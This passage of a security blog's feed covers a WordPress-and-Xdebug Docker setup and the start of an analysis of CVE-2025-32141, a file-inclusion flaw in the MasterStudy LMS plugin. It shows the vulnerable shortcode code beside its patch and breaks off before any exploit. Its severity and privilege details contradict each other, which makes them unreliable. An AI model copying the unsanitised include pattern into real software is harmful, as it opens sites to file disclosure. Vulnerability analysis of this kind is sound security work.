aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo thư mục mới để chứa toàn bộ cấu hình:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mkdir wordpress-docker &amp;amp;&amp;amp; cd wordpress-docker&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-dockerfile&#34;&gt;&lt;span&gt;Create Dockerfile&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-dockerfile&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Image WordPress mặc định &lt;strong&gt;chưa có Xdebug&lt;/strong&gt;, nên ta mở rộng bằng &lt;code&gt;Dockerfile&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano Dockerfile&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Nội dung:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;FROM wordpress:latest&#xA;&#xA;# Cài đặt Xdebug&#xA;RUN pecl install xdebug &amp;amp;&amp;amp; docker-php-ext-enable xdebug&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-docker-composeyml&#34;&gt;&lt;span&gt;Create docker-compose.yml&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-docker-composeyml&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo file để cấu hình toàn bộ hệ thống:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano docker-compose.yml&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Nội dung:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;services:&#xA;  db:&#xA;    image: mysql:latest&#xA;    container_name: wp_db&#xA;    restart: always&#xA;    environment:&#xA;      MYSQL_ROOT_PASSWORD: root&#xA;      MYSQL_DATABASE: wordpress&#xA;      MYSQL_USER: wordpress&#xA;      MYSQL_PASSWORD: wordpress&#xA;    volumes:&#xA;      - db_data:/var/lib/mysql&#xA;&#xA;  wordpress:&#xA;    build: .&#xA;    container_name: wp_app&#xA;    depends_on:&#xA;      - db&#xA;    ports:&#xA;      - &amp;#34;80:80&amp;#34;&#xA;    restart: always&#xA;    environment:&#xA;      WORDPRESS_DB_HOST: db:3306&#xA;      WORDPRESS_DB_USER: wordpress&#xA;      WORDPRESS_DB_PASSWORD: wordpress&#xA;      WORDPRESS_DB_NAME: wordpress&#xA;    volumes:&#xA;      - ./wordpress:/var/www/html&#xA;      - ./php.ini:/usr/local/etc/php/conf.d/php.ini&#xA;&#xA;volumes:&#xA;  db_data:&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;volumes:&lt;/code&gt; dùng để &lt;strong&gt;lưu trữ dữ liệu và đồng bộ mã nguồn&lt;/strong&gt; giữa máy thật và container.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Giải thích:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;db_data:/var/lib/mysql&lt;/code&gt;&lt;/strong&gt;&#xA;Lưu dữ liệu MySQL bền vững, không mất khi xóa container.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;./wordpress:/var/www/html&lt;/code&gt;&lt;/strong&gt;&#xA;Đồng bộ mã nguồn WordPress giữa máy và container, giúp sửa code trực tiếp.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;./php.ini:/usr/local/etc/php/conf.d/php.ini&lt;/code&gt;&lt;/strong&gt;&#xA;Gắn file cấu hình PHP/Xdebug, dễ tùy chỉnh mà không cần rebuild image.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-phpini&#34;&gt;&lt;span&gt;Create php.ini&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-phpini&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Kích hoạt Xdebug và cấu hình PHP.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano php.ini&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Nội dung:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;zend_extension=xdebug&#xA;xdebug.mode=debug&#xA;xdebug.start_with_request=yes&#xA;xdebug.client_host=172.17.0.1&#xA;xdebug.client_port=9003&#xA;xdebug.log_level=0&#xA;&#xA;upload_max_filesize = 64M&#xA;post_max_size = 64M&#xA;memory_limit = 128M&#xA;max_execution_time = 300&#xA;max_input_time = 300&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Giải thích:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Các dòng &lt;code&gt;xdebug.*&lt;/code&gt; giúp kết nối với VS Code khi debug.&lt;/li&gt;&#xA;&lt;li&gt;Các dòng sau tăng giới hạn upload và tài nguyên PHP.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;create-vs-code-launch-configuration&#34;&gt;&lt;span&gt;Create VS Code Launch Configuration&lt;/span&gt;&#xA;  &lt;a href=&#34;#create-vs-code-launch-configuration&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo file cấu hình VS Code để kết nối với Xdebug:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mkdir .vscode &amp;amp;&amp;amp; nano .vscode/launch.json&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Nội dung:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;version&amp;#34;: &amp;#34;0.2.0&amp;#34;,&#xA;  &amp;#34;configurations&amp;#34;: [&#xA;    {&#xA;      &amp;#34;name&amp;#34;: &amp;#34;Listen for Xdebug&amp;#34;,&#xA;      &amp;#34;type&amp;#34;: &amp;#34;php&amp;#34;,&#xA;      &amp;#34;request&amp;#34;: &amp;#34;launch&amp;#34;,&#xA;      &amp;#34;port&amp;#34;: 9003,&#xA;      &amp;#34;pathMappings&amp;#34;: {&#xA;        &amp;#34;/var/www/html&amp;#34;: &amp;#34;${workspaceFolder}/wordpress&amp;#34;&#xA;      },&#xA;      &amp;#34;log&amp;#34;: true&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;install-vs-code-extension&#34;&gt;&lt;span&gt;Install VS Code Extension&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-vs-code-extension&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Mở VS Code → &lt;strong&gt;Extensions (Ctrl + Shift + X)&lt;/strong&gt; → Cài đặt:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP Debug (by Xdebug)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;run-docker-compose&#34;&gt;&lt;span&gt;Run Docker Compose&lt;/span&gt;&#xA;  &lt;a href=&#34;#run-docker-compose&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Khởi động hệ thống:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;docker-compose up -d&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi khởi chạy, truy cập &lt;strong&gt;&lt;a href=&#34;http://localhost&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost&lt;/a&gt;&lt;/strong&gt; để cài đặt WordPress.&#xA;Giờ bạn có thể đặt breakpoint trong file PHP và debug trực tiếp trên VS Code.&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32141 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-21-cve-2025-32141/</link>
      <pubDate>Tue, 21 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-21-cve-2025-32141/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-21-cve-2025-32141/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;MasterStudy LMS&lt;/strong&gt; phiên bản &lt;strong&gt;≤ 3.5.28&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh &lt;code&gt;include/require&lt;/code&gt;, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32141&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32141&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.28&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.29&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/masterstudy-lms-learning-management-system/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MasterStudy LMS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;MasterStudy LMS&lt;/strong&gt;: &lt;strong&gt;3.5.28&lt;/strong&gt; (vulnerable) và &lt;strong&gt;3.5.29&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;add_shortcode( &amp;#39;stm_lms_courses_categories&amp;#39;, &amp;#39;stm_lms_courses_categories_shortcode&amp;#39; );&#xA;function stm_lms_courses_categories_shortcode( $atts ) {&#xA;    $atts = shortcode_atts(&#xA;        array(&#xA;            &amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;style&amp;#39;    =&amp;gt; &amp;#39;style_1&amp;#39;,&#xA;        ),&#xA;        $atts&#xA;    );&#xA;    ob_start();&#xA;    STM_LMS_Templates::stm_lms_load_vc_element( &amp;#39;courses_categories&amp;#39;, $atts, $atts[&amp;#39;style&amp;#39;] );&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, callback của shortcode &lt;code&gt;stm_lms_courses_categories&lt;/code&gt; lấy trực tiếp giá trị &lt;code&gt;style&lt;/code&gt; từ mảng &lt;code&gt;$atts&lt;/code&gt; và truyền thẳng vào &lt;code&gt;STM_LMS_Templates::stm_lms_load_vc_element()&lt;/code&gt; mà không có bất kỳ kiểm tra hay làm sạch đầu vào nào =&amp;gt; LFI có thể xảy ra.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;add_shortcode( &amp;#39;stm_lms_courses_categories&amp;#39;, &amp;#39;stm_lms_courses_categories_shortcode&amp;#39; );&#xA;function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = &amp;#39;&amp;#39; ) {&#xA;&#x9;$atts = shortcode_atts(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;style&amp;#39;    =&amp;gt; &amp;#39;style_1&amp;#39;,&#xA;&#x9;&#x9;),&#xA;&#x9;&#x9;$atts,&#xA;&#x9;&#x9;$tag&#xA;&#x9;);&#xA;&#x9;$atts[&amp;#39;style&amp;#39;] = basename( sanitize_file_name( $atts[&amp;#39;style&amp;#39;] ) );&#xA;&#x9;ob_start();&#xA;&#x9;STM_LMS_Templates::stm_lms_load_vc_element( &amp;#39;courses_categories&amp;#39;, $atts, $atts[&amp;#39;style&amp;#39;] );&#xA;&#x9;return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã sanitize &lt;code&gt;$atts[&#39;style&#39;]&lt;/code&gt; bằng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_file_name/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_file_name()&lt;/code&gt;&lt;/a&gt; đã loại bỏ chuỗi/ký tự không an toàn =&amp;gt; ngăn chặn LFI.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 